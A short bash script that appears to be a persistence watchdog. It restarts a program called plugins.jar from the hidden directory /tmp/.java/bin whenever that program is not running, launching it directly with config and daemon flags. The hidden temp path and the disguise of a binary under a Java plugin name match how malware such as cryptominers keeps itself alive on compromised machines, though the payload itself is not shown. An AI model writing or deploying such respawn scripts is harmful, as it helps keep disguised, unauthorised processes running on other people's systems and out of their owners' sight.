#!/bin/bash
process="plugins.jar -c ./cfg.conf -d"
# command="cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d"

if ps ax | grep -v grep | grep "$process" > /dev/null
then
    exit
else
    cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
fi

exit
# 